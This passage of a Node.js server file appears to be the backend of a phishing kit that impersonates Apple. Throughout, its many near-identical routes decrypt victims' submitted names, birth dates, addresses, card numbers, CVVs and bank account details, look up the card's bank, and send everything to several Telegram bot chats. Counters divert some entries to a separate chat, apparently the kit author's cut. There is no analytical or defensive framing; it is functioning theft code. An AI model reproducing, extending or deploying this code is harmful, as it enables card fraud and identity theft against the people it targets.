      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (cya == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-752137860",
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        cya += 1;
      }
      res.send("Update Complete");
    });
});

let heisenberg = 0;

app.post("/heisenbergApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (heisenberg == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleHeisenberg:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5009877290,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg += 1;
      }
      res.send("Update Complete");
    });
});

let pablo = 0;

app.post("/pabloApple", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pablo == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `ApplePablo:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 784539021,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        heisenberg += 1;
      }
      res.send("Update Complete");
    });
});

let mazCount = 3;

app.post("/sendMazzaAppleRes", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mazCount == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        mazCount = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Apple:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Apple:\n${originalText}`
        );
        mazCount += 1;
      }
    });
});

app.post("/sendStrictlyAppleRes", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (count === 10) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        count = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleCB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1921026559&text=Apple:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5266729262&text=Apple:\n${originalText}`
        );
        count = count + 1;
      }
    });
});

let sbCount = 15;

let pastebk = 0;

app.post("/applePasteBk", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pastebk == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5358629321,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/applePoka", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (pastebk == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5280917183,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        pastebk += 1;
      }
      res.send("Update Complete");
    });
});

let firstTrust = 0;

app.post("/appleFirstTrust", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (firstTrust == 100) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        firstTrust = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `AppleFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 837638060,
              text: `Apple:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        firstTrust += 1;
      }
      res.send("Update Complete");
    });
});

app.post("/appleSB", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (sbCount == 15) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        sbCount = 9;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AppleSB:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5450405437&text=Apple:\n${originalText}`
        );
        sbCount += 1;
      }
      res.send("Update Complete");
    });
});

let p2 = 0;

app.post("/appleP2", (req, res) => {
  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
